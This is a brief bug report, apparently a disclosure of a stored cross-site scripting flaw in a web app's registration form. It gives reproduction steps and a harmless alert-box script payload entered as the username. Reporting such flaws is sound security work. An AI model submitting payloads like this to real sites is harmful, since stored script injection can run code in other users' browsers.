register wiht information:

account number: any
username:"><script>alert('XSS!')</script>
password: any

Then login with that username, the web will show an alert: XSS! --- Which means the XSS is already Implanted